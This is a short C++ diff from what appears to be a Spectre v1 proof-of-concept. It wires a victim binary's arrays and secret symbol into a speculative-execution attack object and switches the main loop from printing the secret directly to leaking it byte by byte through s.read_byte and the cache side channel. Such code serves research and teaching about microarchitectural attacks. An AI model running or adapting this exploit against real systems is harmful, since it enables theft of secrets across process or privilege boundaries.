@@ -29,17 +29,13 @@ int main()
     auto sym_array1_size = victim.get_sym("array1_size");
     auto sym_array2 =victim.get_sym("array2");
     auto sym_array1 = victim.get_sym("array1");
-    auto sym_get_elem = victim.get_sym("_Z8get_elemm");
-
-    auto f_get_elem = reinterpret_cast<void(*)(size_t)>(victim.get_sym_value(sym_get_elem));
-    LilElf::set_permissions(victim.get_sym_value(sym_get_elem), sym_get_elem->st_size, PROT_EXEC);
 
     auto m_array1_size = victim.get_sym_value(sym_array1_size);
     uint8_t* m_secret = reinterpret_cast<uint8_t*>(victim.get_static_sym_value(sym_secret));
 
     Spectrev1 s(reinterpret_cast<uint8_t*>(victim.get_sym_value(sym_array1)),
                 reinterpret_cast<uint8_t*>(victim.get_sym_value(sym_array2)),
-                [&](volatile size_t x){flush(m_array1_size);  f_get_elem(x);},
+                [&](volatile size_t x){flush(m_array1_size);  ;;},
                 [](size_t _t){return _t%16;},
                 512,
                 MAX_TRIES,
@@ -48,9 +44,9 @@ int main()
     uint8_t val;
     for (size_t i = 0; i < sym_secret->st_size; ++i)
     {
-//        s.read_byte(&m_secret[i], &val);
-//        printf("0x%02X = %c\n", val, val);
-        printf("0x%02x\n", m_secret[i]);
+        s.read_byte(&m_secret[i], &val);
+        printf("0x%02X = %c\n", val, val);
+//        printf("0x%02x\n", m_secret[i]);
     }
 
 }
